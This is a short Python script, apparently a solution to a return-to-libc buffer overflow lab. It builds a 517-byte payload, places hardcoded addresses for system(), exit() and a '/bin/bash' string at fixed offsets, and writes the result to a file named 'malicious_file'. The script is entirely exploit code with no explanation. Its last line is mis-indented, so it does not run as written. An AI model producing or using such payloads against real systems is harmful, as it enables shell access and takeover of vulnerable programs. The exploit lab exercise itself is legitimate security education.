#!/usr/bin/env python3

if __name__ == "__main__":
    payload = bytearray(0xaa for i in range(517))

    bash_addr = 0xbffffdf1
    payload[44:48] = (bash_addr).to_bytes(4, byteorder="little")

    exit_addr = 0xb7e369d0
    payload[40:44] = (exit_addr).to_bytes(4, byteorder="little")

    system_addr = 0xb7e42da0
    payload[36:40] = (system_addr).to_bytes(4, byteorder="little")

    with open("malicious_file", "wb") as f:
    f.write(payload)
